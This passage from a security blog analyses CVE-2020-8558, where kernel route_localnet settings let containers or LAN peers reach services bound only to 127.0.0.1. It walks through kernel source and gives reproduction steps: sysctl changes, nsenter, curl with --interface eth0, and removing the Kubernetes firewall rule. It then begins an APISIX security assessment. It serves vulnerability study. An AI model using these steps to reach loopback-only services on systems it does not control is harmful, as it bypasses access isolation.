<li>传输层：发现当前”网络命名空间”确实有服务监听 <code>127.0.0.1:8888</code>, 和 “目的ip:目的端口” 可以匹配上，于是准备回复syn-ack包</li>
</ul>
<blockquote>
<p>从”内核协议栈”角度看，发送包会经过”传输层、网络层、链路层、设备驱动”，接受包刚好相反，会经过”设备驱动、链路层、网络层、传输层”</p>
</blockquote>
<p>syn-ack数据包信息是:</p>
<table>
<thead>
<tr>
<th>源ip</th>
<th>源mac</th>
<th>目的ip</th>
<th>目的mac</th>
<th>目的端口</th>
<th>源端口</th>
</tr>
</thead>
<tbody><tr>
<td>127.0.0.1</td>
<td>mac_b</td>
<td>ip_a</td>
<td>mac_a</td>
<td>44444(某个随机端口)</td>
<td>8888</td>
</tr>
</tbody></table>
<p>syn-ack包的数据流向是：B -&gt; 交换机 -&gt; A</p>
<p>A机器网卡在收到syn-ack包后，也会走一遍”内核协议栈”的流程，然后发送ack包，完成tcp握手。</p>
<p>这样A就能访问到B机器上”仅绑定在127.0.0.1的服务”。所以，在局域网内，恶意节点”似乎”很容易就能访问到其他节点的”仅绑定在127.0.0.1的服务”。</p>
<p>但实际上，A访问到B机器上”仅绑定在127.0.0.1的服务”会因为两大类原因失败：</p>
<ul>
<li>交换机有做检查，比如它不允许数据包的目的ip地址是127.0.0.1，这样第一个syn包就不会转发给B，tcp握手会失败。公有云厂商的交换机(比如ovs)应该就有类似检查，所以我在某个公有云厂商vpc网络环境下测试，无法成功复现漏洞。</li>
<li>数据包到了主机，但是因为ip是127.0.0.1，很特殊，所以”内核协议栈”为了安全把包丢掉了。</li>
</ul>
<p>所以不能在云vpc环境下实验，于是我选择了复现”容器访问宿主机上的仅绑定在127.0.0.1的服务”。</p>
<p>先来看一下，”内核协议栈”为了防止恶意访问”仅绑定在127.0.0.1的服务”都做了哪些限制。</p>
<h1 id="“内核协议栈”做了哪些限制？"><a href="#“内核协议栈”做了哪些限制？" class="headerlink" title="“内核协议栈”做了哪些限制？"></a>“内核协议栈”做了哪些限制？</h1><p>先说结论，下面三个内核参数都会影响</p>
<ul>
<li>route_localnet</li>
<li>rp_filter</li>
<li>accept_local</li>
</ul>
<p>以docker网桥模式为例，想要在docker容器中访问到宿主机的”仅绑定在127.0.0.1的服务”，就需要：</p>
<ul>
<li>宿主机上 route_localnet=1</li>
<li>docker容器中 rp_filter=0、accept_local=1、route_localnet=1</li>
</ul>
<p>宿主机网络命名空间中</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-h9w7mlyv ~]# sysctl -a|grep route_localnet</span><br><span class="line">net.ipv4.conf.all.route_localnet &#x3D; 1</span><br><span class="line">net.ipv4.conf.default.route_localnet &#x3D; 1</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>容器网络命名空间中</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-h9w7mlyv ~]# sysctl -a|grep accept_local</span><br><span class="line">net.ipv4.conf.all.accept_local &#x3D; 1</span><br><span class="line">net.ipv4.conf.default.accept_local &#x3D; 1</span><br><span class="line">net.ipv4.conf.eth0.accept_local &#x3D; 1</span><br><span class="line">[root@instance-h9w7mlyv ~]# sysctl -a|grep &#39;\.rp_filter&#39;</span><br><span class="line">net.ipv4.conf.all.rp_filter &#x3D; 0</span><br><span class="line">net.ipv4.conf.default.rp_filter &#x3D; 0</span><br><span class="line">net.ipv4.conf.eth0.rp_filter &#x3D; 0</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<blockquote>
<p>容器中和宿主机中因为是不同的网络命名空间，所以关于网络的内核参数是隔离的，并一定相同。</p>
</blockquote>
<h1 id="route-localnet配置"><a href="#route-localnet配置" class="headerlink" title="route_localnet配置"></a>route_localnet配置</h1><h2 id="是什么？"><a href="#是什么？" class="headerlink" title="是什么？"></a>是什么？</h2><p><a target="_blank" rel="noopener" href="https://www.kernel.org/doc/Documentation/networking/ip-sysctl.txt">内核文档</a>提到route_localnet参数，如果route_localnet等于0，当收到源ip或者目的ip是”loopback地址”(127.0.0.0/8)时，就会认为是非法数据包，将数据包丢弃。</p>
<blockquote>
<p>宿主机上curl 127.0.0.1时，源ip和目的都是127.0.0.1，此时网络能正常通信，说明数据包并没有被丢弃。说明这种情景下，没有调用到 ip_route_input_noref 函数查找路由表。</p>
</blockquote>
<p>CVE-2020-8558漏洞中，kube-proxy设置route_localnet=1，导致关闭了上面所说的检查。</p>
<h2 id="内核协议栈中哪里用route-localnet配置来检查？"><a href="#内核协议栈中哪里用route-localnet配置来检查？" class="headerlink" title="内核协议栈中哪里用route_localnet配置来检查？"></a>内核协议栈中哪里用route_localnet配置来检查？</h2><p><a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v4.18/source/net/ipv4/route.c#L1912">https://elixir.bootlin.com/linux/v4.18/source/net/ipv4/route.c#L1912</a></p>
<p>ip_route_input_slow 函数中用到 route_localnet配置，如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;*</span><br><span class="line"> *	NOTE. We drop all the packets that has local source</span><br><span class="line"> *	addresses, because every properly looped back packet</span><br><span class="line"> *	must have correct destination already attached by output routine.</span><br><span class="line"> *</span><br><span class="line"> *	Such approach solves two big problems:</span><br><span class="line"> *	1. Not simplex devices are handled properly.</span><br><span class="line"> *	2. IP spoofing attempts are filtered with 100% of guarantee.</span><br><span class="line"> *	called with rcu_read_lock()</span><br><span class="line"> *&#x2F;</span><br><span class="line"></span><br><span class="line">static int ip_route_input_slow(struct sk_buff *skb, __be32 daddr, __be32 saddr,</span><br><span class="line">			       u8 tos, struct net_device *dev,</span><br><span class="line">			       struct fib_result *res)</span><br><span class="line">&#123;</span><br><span class="line">	...</span><br><span class="line">	&#x2F;* Following code try to avoid calling IN_DEV_NET_ROUTE_LOCALNET(),</span><br><span class="line">	 * and call it once if daddr or&#x2F;and saddr are loopback addresses</span><br><span class="line">	 *&#x2F;</span><br><span class="line">	if (ipv4_is_loopback(daddr)) &#123;		&#x2F;&#x2F; 目的地址是否&quot;loopback地址&quot;</span><br><span class="line">		if (!IN_DEV_NET_ROUTE_LOCALNET(in_dev, net))	&#x2F;&#x2F; localnet配置是否开启。net是网络命名空间，in_dev是接收数据包设备配置信息</span><br><span class="line">			goto martian_destination;		&#x2F;&#x2F; 认为是非法数据包</span><br><span class="line">	&#125; else if (ipv4_is_loopback(saddr)) &#123;		&#x2F;&#x2F; 源地址是否&quot;loopback地址&quot;</span><br><span class="line">		if (!IN_DEV_NET_ROUTE_LOCALNET(in_dev, net))</span><br><span class="line">			goto martian_source;	&#x2F;&#x2F; 认为是非法数据包</span><br><span class="line">	&#125;</span><br><span class="line">	...</span><br><span class="line">	err &#x3D; fib_lookup(net, &amp;fl4, res, 0);		&#x2F;&#x2F; 查找&quot;路由表&quot;，res存放查找结果</span><br><span class="line">	...</span><br><span class="line">	if (res-&gt;type &#x3D;&#x3D; RTN_BROADCAST)</span><br><span class="line">	...</span><br><span class="line">	if (res-&gt;type &#x3D;&#x3D; RTN_LOCAL) &#123;	&#x2F;&#x2F; 数据包应该本机处理</span><br><span class="line">		err &#x3D; fib_validate_source(skb, saddr, daddr, tos,</span><br><span class="line">				  0, dev, in_dev, &amp;itag);  &#x2F;&#x2F; &quot;反向查找&quot;, 验证源地址是否有问题</span><br><span class="line">		if (err &lt; 0)</span><br><span class="line">			goto martian_source;</span><br><span class="line">		goto local_input; &#x2F;&#x2F; 本机处理</span><br><span class="line">	&#125;</span><br><span class="line">	if (!IN_DEV_FORWARD(in_dev)) &#123;   &#x2F;&#x2F; 没有开启ip_forward配置时，认为不支持 转发数据包</span><br><span class="line">		err &#x3D; -EHOSTUNREACH;</span><br><span class="line">		goto no_route;</span><br><span class="line">	&#125;</span><br><span class="line">	...</span><br><span class="line">	err &#x3D; ip_mkroute_input(skb, res, in_dev, daddr, saddr, tos, flkeys); 	&#x2F;&#x2F; 认为此包需要&quot;转发&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">static int ip_rcv_finish(struct net *net, struct sock *sk, struct sk_buff *skb)</span><br><span class="line">&#123;</span><br><span class="line">	...</span><br><span class="line"></span><br><span class="line">	&#x2F;*</span><br><span class="line">	 *	Initialise the virtual path cache for the packet. It describes</span><br><span class="line">	 *	how the packet travels inside Linux networking.</span><br><span class="line">	 *&#x2F;</span><br><span class="line">	if (!skb_valid_dst(skb)) &#123;	&#x2F;&#x2F; 是否有路由缓存. 宿主机curl 127.0.0.1时，就有缓存，不用查找路由表。</span><br><span class="line">		err &#x3D; ip_route_input_noref(skb, iph-&gt;daddr, iph-&gt;saddr,</span><br><span class="line">					   iph-&gt;tos, dev);	&#x2F;&#x2F; 查找路由表</span><br><span class="line">		if (unlikely(err))</span><br><span class="line">			goto drop_error;</span><br><span class="line">	&#125;</span><br><span class="line">	...</span><br><span class="line">	return dst_input(skb);   &#x2F;&#x2F; 将数据包交给tcp层(ip_local_deliver) 或 转发数据包(ip_forward)</span><br></pre></td></tr></table></figure>

<p>在收到数据包时，从ip层来看，数据包会经过 ip_rcv(ip层入口函数) -&gt; ip_rcv_finish -&gt; ip_route_input_slow。</p>
<p>在ip_route_input_slow函数中可以看到，如果源ip或者目的ip是”loopback地址”，并且接收数据包的设备没有配置route_localnet选项时，就会认为是非法数据包。</p>
<h1 id="rp-filter和accept-local"><a href="#rp-filter和accept-local" class="headerlink" title="rp_filter和accept_local"></a>rp_filter和accept_local</h1><h2 id="是什么？-1"><a href="#是什么？-1" class="headerlink" title="是什么？"></a>是什么？</h2><p><a target="_blank" rel="noopener" href="https://www.kernel.org/doc/Documentation/networking/ip-sysctl.txt">内核网络参数详解</a> 提到，rp_filter=1时，会严格验证源ip。</p>
<p>怎么检查源ip呢？就是收到数据包后，将源ip和目的ip对调，然后再查找路由表，找到会用哪个设备回包。如果”回包的设备”和”收到数据包的设备”不一致，就有可能校验失败。这个也就是后面说的”反向检查”。</p>
<h2 id="内核协议栈中哪里用rp-filter和accept-local配置来检查？"><a href="#内核协议栈中哪里用rp-filter和accept-local配置来检查？" class="headerlink" title="内核协议栈中哪里用rp_filter和accept_local配置来检查？"></a>内核协议栈中哪里用rp_filter和accept_local配置来检查？</h2><p>上面提到 收到数据包时，从ip层来看，会执行 ip_route_input_slow 函数查找路由表。</p>
<p>ip_route_input_slow 函数会执行 fib_validate_source 函数执行 “验证源ip”，会使用到rp_filter和accept_local配置</p>
<p><a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v4.18/source/net/ipv4/fib_frontend.c#L412">https://elixir.bootlin.com/linux/v4.18/source/net/ipv4/fib_frontend.c#L412</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;* Ignore rp_filter for packets protected by IPsec. *&#x2F;</span><br><span class="line">int fib_validate_source(struct sk_buff *skb, __be32 src, __be32 dst,</span><br><span class="line">			u8 tos, int oif, struct net_device *dev,</span><br><span class="line">			struct in_device *idev, u32 *itag)</span><br><span class="line">&#123;</span><br><span class="line">	int r &#x3D; secpath_exists(skb) ? 0 : IN_DEV_RPFILTER(idev);	&#x2F;&#x2F; r&#x3D;rp_filter配置</span><br><span class="line">	struct net *net &#x3D; dev_net(dev);</span><br><span class="line"></span><br><span class="line">	if (!r &amp;&amp; !fib_num_tclassid_users(net) &amp;&amp;</span><br><span class="line">	    (dev-&gt;ifindex !&#x3D; oif || !IN_DEV_TX_REDIRECTS(idev))) &#123;		&#x2F;&#x2F; dev-&gt;ifindex !&#x3D; oif 表示 不是lo虚拟网卡接收到包</span><br><span class="line">		if (IN_DEV_ACCEPT_LOCAL(idev))			&#x2F;&#x2F; accept_local配置是否打开。idev是接受数据包的网卡配置</span><br><span class="line">			goto ok;</span><br><span class="line">		&#x2F;* with custom local routes in place, checking local addresses</span><br><span class="line">		 * only will be too optimistic, with custom rules, checking</span><br><span class="line">		 * local addresses only can be too strict, e.g. due to vrf</span><br><span class="line">		 *&#x2F;</span><br><span class="line">		if (net-&gt;ipv4.fib_has_custom_local_routes ||</span><br><span class="line">		    fib4_has_custom_rules(net))		&#x2F;&#x2F;  检查&quot;网络命名空间&quot;中是否有自定义的&quot;策略路由&quot;</span><br><span class="line">			goto full_check;</span><br><span class="line">		if (inet_lookup_ifaddr_rcu(net, src))		&#x2F;&#x2F; 检查&quot;网络命名空间&quot;中是否有设备的ip和源ip(src值)相同</span><br><span class="line">			return -EINVAL;</span><br><span class="line"></span><br><span class="line">ok:</span><br><span class="line">		*itag &#x3D; 0;</span><br><span class="line">		return 0;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">full_check:</span><br><span class="line">	return __fib_validate_source(skb, src, dst, tos, oif, dev, r, idev, itag);		&#x2F;&#x2F; __fib_validate_source中会执行&quot;反向检查源ip&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当在容器中<code>curl 127.0.0.1 --interface eth0</code>时，有一些结论：</p>
<ul>
<li>宿主机收到请求包时，无论 accept_local和rp_filter是啥值，都通过fib_validate_source检查</li>
<li>容器中收到请求包时，必须要设置 accept_local=1、rp_filter=0，才能不被”反向检查源ip”</li>
</ul>
<p>如果容器中 accept_local=1、rp_filter=0 有一个条件不成立，就会发生丢包。这个时候如果你在容器网络命名空间用<code>tcpdump -i eth0 &#39;port 8888&#39; -n -e</code>观察，就会发现诡异的现象：容器接收到了syn-ack包，但是没有回第三个ack握手包。如下图<br><img src="https://user-images.githubusercontent.com/1846319/178766286-0fe2fa0d-19e7-40d0-bb7e-1b6c48d05543.png" alt="img"></p>
<blockquote>
<p>小技巧：nsenter -n -t 容器进程pid 可以进入到容器网络空间，接着就可以tcpdump抓”容器网络中的包”</p>
</blockquote>
<h1 id="docker网桥模式下复现漏洞"><a href="#docker网桥模式下复现漏洞" class="headerlink" title="docker网桥模式下复现漏洞"></a>docker网桥模式下复现漏洞</h1><h2 id="docker网桥模式下漏洞原理是什么？"><a href="#docker网桥模式下漏洞原理是什么？" class="headerlink" title="docker网桥模式下漏洞原理是什么？"></a>docker网桥模式下漏洞原理是什么？</h2><p>借用网络上的一张图来说明docker网桥模式<br><img src="https://s2.51cto.com/wyfs02/M01/95/EE/wKiom1kbITPzNeJPAABs0ju69Io610.png-wh_500x0-wm_3-wmp_4-s_2144315777.png" alt="img"></p>
<p>在容器内<code>curl 127.0.0.1:8888 --interface eth0</code>时，发送第一个syn包时，在网络层查找路由表</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-h9w7mlyv ~]# ip route show</span><br><span class="line">default via 172.17.0.1 dev eth0</span><br><span class="line">172.17.0.0&#x2F;16 dev eth0 proto kernel scope link src 172.17.0.3</span><br></pre></td></tr></table></figure>
<p>因此会走默认网关(172.17.0.1)，在链路层就会找网关的mac地址</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-h9w7mlyv ~]# arp -a|grep 172.17.0.1</span><br><span class="line">_gateway (172.17.0.1) at 02:42:af:2e:cd:ae [ether] on eth0</span><br></pre></td></tr></table></figure>

<p>实际上<code>02:42:af:2e:cd:ae</code>就是docker0网桥的mac地址，所以网关就是docker0网桥</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-h9w7mlyv ~]# ifconfig docker0</span><br><span class="line">docker0: flags&#x3D;4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255</span><br><span class="line">        ...</span><br><span class="line">        ether 02:42:af:2e:cd:ae  txqueuelen 0  (Ethernet)</span><br><span class="line">        ...</span><br></pre></td></tr></table></figure>

<p>因此第一个syn包信息是</p>
<table>
<thead>
<tr>
<th>源ip</th>
<th>目的ip</th>
<th>源mac</th>
<th>目的mac</th>
<th>源端口</th>
<th>目的端口</th>
</tr>
</thead>
<tbody><tr>
<td>容器eth0 ip</td>
<td>127.0.0.1</td>
<td>容器eth0 mac</td>
<td>docker0 mac</td>
<td>4444(随机端口)</td>
<td>8888</td>
</tr>
</tbody></table>
<p>syn包数据包数据流向是 容器内eth0 -&gt; veth -&gt; docker0。</p>
<p>veth设备作为docker0网桥的”从设备”，接收到syn包后直接转发，不会调用到”内核协议栈”的网络层。</p>
<p>docker0网桥设备收到syn包后，在”内核协议栈”的链路层，看到目的mac是自己，就把包扔给网络层处理。在网络层查路由表，看到目的ip是本机ip，就将包扔给传输层处理。在传输层看到访问”127.0.0.1:8888”，就会查看是不是有服务监听在”127.0.0.1:8888”。</p>
<h2 id="怎么复现？-1"><a href="#怎么复现？-1" class="headerlink" title="怎么复现？"></a>怎么复现？</h2><p>从上面分析可以看出来，需要将宿主机docker0网桥设备route_localnet设置成1。</p>
<p>宿主机docker0网桥设备需要设置rp_filter和accept_local选项吗？答案是不需要，因为docker0网桥设备在收到数据包在网络层做”反向检查源地址”时，会知道”响应数据包”也从docker0网桥发送。”发送和接收数据包的设备”是匹配的，所以能通过”反向检查源地址”的校验。</p>
<p>容器中eth0网卡需要设置rp_filter=0、accept_local=1、localnet=1。为什么容器中eth0网卡需要设置rp_filter和accept_local选项呢？因为eth0网桥设备如果做”反向检查源地址”，就会知道响应包应该从lo网卡发送。”接收到数据包的设备是eth0网卡”，而”发送数据包的设备应该是lo网卡”，两个设备不匹配，”反向检查”就会失败。rp_filter=0、accept_local=1可以避免做”反向检查源地址”。</p>
<blockquote>
<p>即使ifconfig lo down，<code>ip route show table local</code>仍能看到local表中有回环地址的路由。</p>
</blockquote>
<p>下面你可以跟着我来用docker复现漏洞。</p>
<p>首先在宿主机上打开route_localnet配置</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-h9w7mlyv ~]# sysctl -w net.ipv4.conf.all.route_localnet&#x3D;1</span><br></pre></td></tr></table></figure>

<p>然后创建容器，并进入到容器网络命名空间，设置rp_filter=0、accept_local=1</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-h9w7mlyv ~]# docker run -d busybox tail -f &#x2F;dev&#x2F;null		&#x2F;&#x2F; 创建容器</span><br><span class="line">62ba93fbbe7a939b7fff9a9598b546399ab26ea97858e73759addadabc3ad1f3</span><br><span class="line">[root@instance-h9w7mlyv ~]# docker top 62ba93fbbe7a939b7fff9a9598b546399ab26ea97858e73759addadabc3ad1f3</span><br><span class="line">UID                 PID                 PPID                C                   STIME               TTY                 TIME                CMD</span><br><span class="line">root                43244               43224               0                   12:33               ?                   00:00:00            tail -f &#x2F;dev&#x2F;null</span><br><span class="line">[root@instance-h9w7mlyv ~]# nsenter -n -t 43244		&#x2F;&#x2F; 进入到容器网络命名空间</span><br><span class="line">[root@instance-h9w7mlyv ~]#</span><br><span class="line">[root@instance-h9w7mlyv ~]# sysctl -w net.ipv4.conf.all.accept_local&#x3D;1	&#x2F;&#x2F; 设置容器中的accept_local配置</span><br><span class="line">[root@instance-h9w7mlyv ~]# sysctl -w net.ipv4.conf.all.rp_filter&#x3D;0		&#x2F;&#x2F; 设置容器中的rp_filter配置</span><br><span class="line">[root@instance-h9w7mlyv ~]# sysctl -w net.ipv4.conf.default.rp_filter&#x3D;0</span><br><span class="line">[root@instance-h9w7mlyv ~]# sysctl -w net.ipv4.conf.eth0.rp_filter&#x3D;0</span><br></pre></td></tr></table></figure>

<blockquote>
<p>如果你是<code>docker exec -ti busybox sh</code>进入到容器中，然后执行<code>sysctl -w</code>配置内核参数，就会发现报错，因为/proc/sys目录默认是作为只读挂载到容器中的，而内核网络参数就在/proc/sys/net目录下。</p>
</blockquote>
<p>然后就可以在容器中使用<code>curl 127.0.0.1:端口号 --interface eth0</code>来访问宿主机上的服务。</p>
<p><img src="https://user-images.githubusercontent.com/1846319/178901165-c010f034-00fe-4c90-b29a-3cd153a4ae10.png" alt="image"></p>
<h1 id="kubernetes对漏洞的修复"><a href="#kubernetes对漏洞的修复" class="headerlink" title="kubernetes对漏洞的修复"></a>kubernetes对漏洞的修复</h1><p>在 <a target="_blank" rel="noopener" href="https://github.com/kubernetes/kubernetes/pull/91569/commits/8bed088224fb38b41255b37e59a1701caefa171b">这个pr</a> 中kubelet添加了一条iptables规则</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@ip-172-31-14-33:~# iptables-save |grep localnet</span><br><span class="line">-A KUBE-FIREWALL ! -s 127.0.0.0&#x2F;8 -d 127.0.0.0&#x2F;8 -m comment --comment &quot;block incoming localnet connections&quot; -m conntrack ! --ctstate RELATED,ESTABLISHED,DNAT -j DROP</span><br></pre></td></tr></table></figure>

<p>这条规则使得，在tcp握手时，第一个syn包如果目的ip是”环回地址”，同时源ip不是”环回地址”时，包会被丢弃。</p>
<blockquote>
<p>所以如果你复现时是在kubernetes环境下，就需要删掉这条iptables规则。</p>
</blockquote>
<p>或许你会有疑问，源ip不也是可以伪造的嘛。确实是这样，所以在 <a target="_blank" rel="noopener" href="https://github.com/kubernetes/kubernetes/pull/91569">https://github.com/kubernetes/kubernetes/pull/91569</a> 中有人评论到，上面的规则，不能防止访问本地udp服务。</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>公有云vpc网络环境下，可能因为交换机有做限制而导致无法访问其他虚拟机的”仅绑定在127.0.0.1的服务”。</p>
<p>docker容器网桥网络环境下，存在漏洞的kube-proxy已经设置了宿主机网络的route_localnet选项，但是因为在容器中<code>/proc/sys</code>默认只读，所以无法修改容器网络命名空间下的内核网络参数，也很难做漏洞利用。</p>
<p>kubernetes的修复方案并不能防止访问本地udp服务。</p>
<blockquote>
<p>如果kubernetes使用了cni插件(比如calico ipip网络模型)，你觉得在node节点能访问到master节点的”仅绑定在127.0.0.1的服务”吗？</p>
</blockquote>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a target="_blank" rel="noopener" href="https://www.kernel.org/doc/Documentation/networking/ip-sysctl.txt">内核网络参数详解</a></p>
<!--
在calico cni环境下实验呢？ master node是可以的。【已验证】 worker node应该是不行的
-->

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2022-06-13-apisix%E5%AE%89%E5%85%A8%E8%AF%84%E4%BC%B0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="leveryd">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="leveryd的个人博客">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2022-06-13-apisix%E5%AE%89%E5%85%A8%E8%AF%84%E4%BC%B0/" class="post-title-link" itemprop="url">apisix安全评估</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2022-06-13 23:08:30" itemprop="dateCreated datePublished" datetime="2022-06-13T23:08:30+08:00">2022-06-13</time>
    </span>
      <span class="post-meta-item">
        <span class="post-meta-item-icon">
          <i class="far fa-calendar-check"></i>
        </span>
        <span class="post-meta-item-text">更新于</span>
        <time title="修改时间：2022-08-18 18:21:18" itemprop="dateModified" datetime="2022-08-18T18:21:18+08:00">2022-08-18</time>
      </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>有大佬已经对 <a target="_blank" rel="noopener" href="https://ricterz.me/posts/2021-07-05-apache-apisix-attack-surface-research.txt">apisix攻击面</a> 做过总结。</p>
<p>本文记录一下自己之前的评估过程。</p>
<h1 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h1><h2 id="评估哪些模块？"><a href="#评估哪些模块？" class="headerlink" title="评估哪些模块？"></a>评估哪些模块？</h2><p>首先我需要知道要评估啥，就像搞渗透时，我得先知道攻击面在哪里。</p>
<p><img src="https://user-images.githubusercontent.com/1846319/185372424-e3bf60ef-8b78-4d2d-9827-3b533b039051.png" alt="image"></p>
<p>根据文档，可以知道apisix项目包括很多系统，包括：</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://github.com/apache/apisix">网关</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/apache/apisix-dashboard">dashboard</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/apache/apisix-ingress-controller">ingress控制器</a></li>
<li>各种sdk</li>
</ul>
<p>sdk即使有漏洞，攻击场景也感觉有限，所以没有评估。</p>
<p>“ingress控制器”需要结合k8s中的网络来做评估，因为时间有限，所以只是粗略看了一下。</p>
<p>我主要看了网关和dashboard两个系统。</p>
<p>从文档上很容易看出来，网关有三个重要的模块：</p>
<ul>
<li>插件</li>
<li>admin api</li>
<li>control api</li>
</ul>
<p><img src="https://files.mdnice.com/user/10280/ec19fa15-01df-4939-af1d-59d34a7f32a7.png"></p>
<p>对于api来说，首先要检查的是”身份认证”和”鉴权”这两个安全措施。</p>
<p>apisix历史漏洞绝大部分都出现在插件中，所以插件属于”漏洞重灾区”。</p>
<h2 id="评估api安全性：身份认证和鉴权"><a href="#评估api安全性：身份认证和鉴权" class="headerlink" title="评估api安全性：身份认证和鉴权"></a>评估api安全性：身份认证和鉴权</h2><p>admin api实现如下：</p>
<ul>
<li>admin api 使用token做认证，token是硬编码的。这个问题已经被提交过漏洞，官方应该不打算修复。</li>
<li>admin api 鉴权上，设计了viewer和非viewer两种角色。viewer角色只允许get方法。</li>
</ul>
<blockquote>
<p>靶场见 <a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/blob/master/apisix/CVE-2020-13945/README.zh-cn.md">Apache APISIX 默认密钥漏洞（CVE-2020-13945）</a></p>
</blockquote>
<p>control api是没有身份认证的，但是有两个点限制了攻击：</p>
<ul>
<li>默认它只在本地监听端口</li>
<li>插件无关的control api只有”读信息”的功能，没有发现啥风险点</li>
</ul>
<p>插件创建的control api是一个潜在的攻击面，不过我没找到啥漏洞。</p>
<h2 id="评估插件安全性"><a href="#评估插件安全性" class="headerlink" title="评估插件安全性"></a>评估插件安全性</h2><p>因为插件默认都是不开启的，所以虽然它是重灾区，但是我并没有投入过多精力去审计。</p>
